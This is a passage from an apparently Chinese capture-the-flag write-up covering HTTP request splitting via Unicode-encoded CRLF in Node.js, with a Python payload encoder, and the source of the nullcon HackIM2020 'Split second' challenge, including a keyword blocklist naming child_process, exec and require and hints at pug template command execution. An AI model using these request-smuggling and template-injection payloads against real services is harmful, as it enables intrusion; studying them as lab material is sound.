&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:3000
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png" alt="image-20211207020732089">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png" alt="image-20211207001654270">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png" alt="image-20211207002041861">&lt;/p>
&lt;p>当然，用完全unicode编码也是可以的，亲测这个全编码容错率会高一丢丢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: 127.0.0.1:3000
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nullcon-hackim2020split-second">[nullcon HackIM2020]Split second&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">//node 8.12.0
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/source.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/getMeme&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;iframe src=&amp;#34;https://giphy.com/embed/LLHkw7UnvY3Kw&amp;#34; width=&amp;#34;480&amp;#34; height=&amp;#34;480&amp;#34; frameBorder=&amp;#34;0&amp;#34; class=&amp;#34;giphy-embed&amp;#34; allowFullScreen&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&amp;#34;&amp;gt;via GIPHY&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;adminauth&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[a-z]/g&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;secretpassword&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;No characters&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;You need to come from localhost&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/getMeme?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;Errrrr, You have been Blocked&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果上一个题仔细分析的话就会发现这个题只是代码做了一些微小的改动&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png" alt="image-20211205214720894">&lt;/p>
&lt;p>需要多构造一个请求头，换行的CRLF和空格SP我们用unicode，而pug执行命令的部分我们可以用八进制字符&lt;/p>
